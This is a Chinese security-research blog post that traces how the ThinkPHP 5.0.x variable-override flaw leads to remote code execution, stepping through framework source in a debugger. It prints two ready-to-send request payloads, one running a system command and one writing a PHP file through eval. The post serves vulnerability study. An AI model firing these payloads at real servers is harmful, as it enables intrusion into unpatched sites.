> 原文链接: https://www.anquanke.com//post/id/245529 


# Thinkphp5.0.0-5.0.18RCE分析


                                阅读量   
                                **268539**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p2.ssl.qhimg.com/t01d72f977a82979965.jpg)](https://p2.ssl.qhimg.com/t01d72f977a82979965.jpg)



```
1.本文一共1732个字 26张图 预计阅读时间15分钟
2.本文作者Panacea 属于Gcow安全团队复眼小组 未经过许可禁止转载
3.本篇文章主要分析了Thinkphp5.0.0-5.0.18RCE情况
4.本篇文章十分适合漏洞安全研究人员进行交流学习
5.若文章中存在说得不清楚或者错误的地方 欢迎师傅到公众号后台留言中指出 感激不尽
```

## 0x00.前言

本篇文章基于`thinkphp5.*`框架，分析两种payload的构成以及执行流程

### <a class="reference-link" name="%E5%87%86%E5%A4%87"></a>准备

Windows+phpstudy

tp版本：thinkphp_5.0.5_full

php版本：5.4.45

phpstorm+xdebug



## 0x01.Payload1

### <a class="reference-link" name="%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90"></a>开始分析

漏洞代码位于：`thinkphp/library/think/Request.php`

首先放上payload：

> s=whoami&amp;_method=__construct&amp;method=post&amp;filter[]=system

[![](https://p0.ssl.qhimg.com/t014ebcdf9bf795eaf8.png)](https://p0.ssl.qhimg.com/t014ebcdf9bf795eaf8.png)

`method`方法主要用来判断请求方式，首先分析一下这段代码的逻辑：通过`$_SERVER`和`server`方法获取请求类型，如果不存在`method`变量值，那么就用表单请求类型伪装变量覆盖`method`的值，那么就可以利用这点调用其他函数，预定义里面`method`为`false`，那么就会直接走下一步的是否存在表单覆盖变量

[![](https://p5.ssl.qhimg.com/t0110d89ceeac8c135c.png)](https://p5.ssl.qhimg.com/t0110d89ceeac8c135c.png)

从`get`方法中获取`var_method`的值，值为`_method`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01da6b7f45a526e030.png)

在`config.php`已经有默认值，但我们构造的payload里面传值`_method=__construct`就是变量覆盖，因此下一步会走到`__construct`方法

```
// 表单请求类型伪装变量
    'var_method'             =&gt; '_method',
```

继续往下跟代码，来到`__construct`构造方法，将数组`option`进行遍历操作，如果`option`的键名为该属性的话，则将该同名的属性赋值给**\$option**的键值，如果`filter`为空的空，就调用默认的`default_filter`值

[![](https://p2.ssl.qhimg.com/t013a3e5ad7437f63be.png)](https://p2.ssl.qhimg.com/t013a3e5ad7437f63be.png)

filter方法：

```
public function filter($filter = null)
    `{`
        if (is_null($filter)) `{`
            return $this-&gt;filter;
        `}` else `{`
            $this-&gt;filter = $filter;
        `}`
    `}`
```

而默认的过滤方法为空

```
// 默认全局过滤方法 用逗号分隔多个
    'default_filter'         =&gt; '',
```

在构造函数里面走完filter之后会走`input`方法，继续跟进

[![](https://p4.ssl.qhimg.com/t01f9fef1cdaa58b6b1.png)](https://p4.ssl.qhimg.com/t01f9fef1cdaa58b6b1.png)

继续往下跟，这里的`method`已经为`post`方法，所以进入`param`方法里的`post`是直接`break`的

[![](https://p3.ssl.qhimg.com/t01efcd1373f63c9beb.png)](https://p3.ssl.qhimg.com/t01efcd1373f63c9beb.png)

下一步进入`filtervalue`方法中，可以看到我们要传入的值已经全部传进了，`call_user_func()`函数将我们传入的**\$filter=system**作为回调函数调用，也就达到了RCE的目的

[![](https://p4.ssl.qhimg.com/t0170475e4a581a9954.png)](https://p4.ssl.qhimg.com/t0170475e4a581a9954.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017e65ed9ebbcad327.png)

[![](https://p5.ssl.qhimg.com/t01beae8bd257201507.png)](https://p5.ssl.qhimg.com/t01beae8bd257201507.png)



## 0x02.Payload2

### <a class="reference-link" name="%E5%89%8D%E6%8F%90"></a>前提

该利用的重点在于在一定条件下可以使用::来调用非静态方法

首先我们需要了解静态属性和静态方法是如何调用的，静态属性一般使用**self::**进行调用，但是在该篇博客上面使用了`::`的骚操作，用`::`调用非静态方法

```
&lt;?php
class People`{`
    static public $name = "pana";
    public $height = 170;

    static public function output()`{`
        //静态方法调用静态属性使用self
        print self::$name."&lt;br&gt;";
        //静态方法调用非静态属性（普通方法）需要先实例化对象
        $t = new People() ;
        print $t -&gt; height."&lt;br&gt;";

    `}`

    public function say()`{`
        //普通方法调用静态属性使用self
        print self::$name."&lt;br&gt;";
        //普通方法调用普通属性使用$this
        print $this -&gt; height."&lt;br&gt;";
    `}`
`}`
$pa = new People();
$pa -&gt; output();
$pa -&gt; say();
//可以使用::调用普通方法
$pan = People::say();
```

可以看到最后的输出，仍然输出了`name`的值，但是却没有输出`height`的值

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01507070c77f52649f.png)

原因在于:php里面使用双冒号调用方法或者属性时候有两种情况：

直接使用::调用静态方法或者属性

::调用普通方法时，需要该方法内部没有调用非静态的方法或者变量，也就是没有使用`$this`，这也就是为什么输出了`name`的值而没有输出`height`

了解上面这些，我们就可以开始下面的分析



## 0x03.分析

先放上流程图（本人比较菜鸡 所以只能用这种方法记录下来流程）

[![](https://p4.ssl.qhimg.com/t0109212b3bddfaec66.png)](https://p4.ssl.qhimg.com/t0109212b3bddfaec66.png)

首先放上payload

```
path=&lt;?php file_put_contents('ccc.php','&lt;?php phpinfo();?&gt;'); ?&gt;&amp;_method=__construct&amp;filter[]=set_error_handler&amp;filter[]=self::path&amp;filter[]=\think\view\driver\Php::Display&amp;method=GET
```

### <a class="reference-link" name="payload%E7%9A%84%E5%88%86%E6%9E%90"></a>payload的分析

使用`file_put_contents()`写入，使用变量覆盖将`_method`的值设置为`_construct`，这里的`set_error_handler`是设置用户自定义的错误处理程序，能够绕过标准的php错误处理程序，接下来就是调用**\think\view\driver\Php**下面的`Display`方法，因为我们要利用里面的

```
eval('?&gt;' . $content);
```

完成RCE的目的

[![](https://p0.ssl.qhimg.com/t012c9573dbb0edb11d.jpg)](https://p0.ssl.qhimg.com/t012c9573dbb0edb11d.jpg)

虽然会报错，但是不影响写入

[![](https://p4.ssl.qhimg.com/t01ad38b624744b2f00.png)](https://p4.ssl.qhimg.com/t01ad38b624744b2f00.png)

首先从App.php开始，在routeCheck方法处打断点

```
public static function routeCheck($request, array $config)
`{`
    $path   = $request-&gt;path();
    $depr   = $config['pathinfo_depr'];
    $result = false;
    // 路由检测
    $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config['url_route_on'];
    if ($check) `{`
        // 开启路由
        if (is_file(RUNTIME_PATH . 'route.php')) `{`
            // 读取路由缓存
            $rules = include RUNTIME_PATH . 'route.php';
            if (is_array($rules)) `{`
                Route::rules($rules);
            `}`
        `}` else `{`
            $files = $config['route_config_file'];
            foreach ($files as $file) `{`
                if (is_file(CONF_PATH . $file . CONF_EXT)) `{`
                    // 导入路由配置
                    $rules = include CONF_PATH . $file . CONF_EXT;
                    if (is_array($rules)) `{`
                        Route::import($rules);
                    `}`
                `}`
            `}`
        `}`
```

这一步主要是获取`$path`的值，也就是我们要走的路由`captcha`

[![](https://p4.ssl.qhimg.com/t01b333653ec70cce9c.png)](https://p4.ssl.qhimg.com/t01b333653ec70cce9c.png)

继续往下走，**$result = Route::check($request, $path, $depr, $config[‘url_domain_deploy’]);**，跟进`check`方法，这里面的重点就是获取`method`的值，`$request-&gt;method()`

[![](https://p3.ssl.qhimg.com/t016e859ce714b08115.png)](https://p3.ssl.qhimg.com/t016e859ce714b08115.png)

这里是调用`var_method`，因为我们传入了`_method=__construct`，也就是变量覆盖，这些步骤和上面的几乎一样

[![](https://p3.ssl.qhimg.com/t018ac20f97c90c352a.png)](https://p3.ssl.qhimg.com/t018ac20f97c90c352a.png)

那下一步继续跟进`__construct`，走完`construct`函数后，可以看到大部分的值都是我们希望传进去的，这时`method`的值为GET，也就是为什么payload里面要传GET的原因

[![](https://p5.ssl.qhimg.com/t01b1e56733ec479c6c.png)](https://p5.ssl.qhimg.com/t01b1e56733ec479c6c.png)

下一步要获取当前请求类型的路由规则

```
$rules = self::$rules[$method];
```

可以看到这里的`rule`和`route`的值都发生了改变，路由值为**\think\captcha\CaptchaController[@index](https://github.com/index)**

[![](https://p4.ssl.qhimg.com/t018450210a3f9746af.png)](https://p4.ssl.qhimg.com/t018450210a3f9746af.png)

接下来跟进`routeCheck()`方法，走完这个方法后，返回`result`值

[![](https://p3.ssl.qhimg.com/t011dfa7a3eb4069ad7.png)](https://p3.ssl.qhimg.com/t011dfa7a3eb4069ad7.png)

接下来进入`dispatch`方法

[![](https://p4.ssl.qhimg.com/t01541022a3ea41f751.png)](https://p4.ssl.qhimg.com/t01541022a3ea41f751.png)

[![](https://p0.ssl.qhimg.com/t017b1a31baf0aa6d9b.png)](https://p0.ssl.qhimg.com/t017b1a31baf0aa6d9b.png)

接下来进入`param`方法，合并请求参数和url地址栏的参数

```
$this-&gt;param = array_merge($this-&gt;get(false), $vars, $this-&gt;route(false));
```

[![](https://p5.ssl.qhimg.com/t01da39bb2d7da03eb0.png)](https://p5.ssl.qhimg.com/t01da39bb2d7da03eb0.png)

然后进入`get`方法，继续跟进`input`方法

[![](https://p3.ssl.qhimg.com/t016c581a10dcfcdbea.png)](https://p3.ssl.qhimg.com/t016c581a10dcfcdbea.png)

[![](https://p4.ssl.qhimg.com/t012df94c0eafff3d27.png)](https://p4.ssl.qhimg.com/t012df94c0eafff3d27.png)

然后就会回到`filterValue`方法执行任意方法

[![](https://p5.ssl.qhimg.com/t0158ce45f40e2dee4c.png)](https://p5.ssl.qhimg.com/t0158ce45f40e2dee4c.png)

[![](https://p1.ssl.qhimg.com/t0133d2229ae69cacc6.png)](https://p1.ssl.qhimg.com/t0133d2229ae69cacc6.png)



## 0x04.参考文章：

[https://y4tacker.blog.csdn.net/article/details/115893304](https://y4tacker.blog.csdn.net/article/details/115893304)

[https://y4tacker.blog.csdn.net/article/details/115893304](https://y4tacker.blog.csdn.net/article/details/115893304)
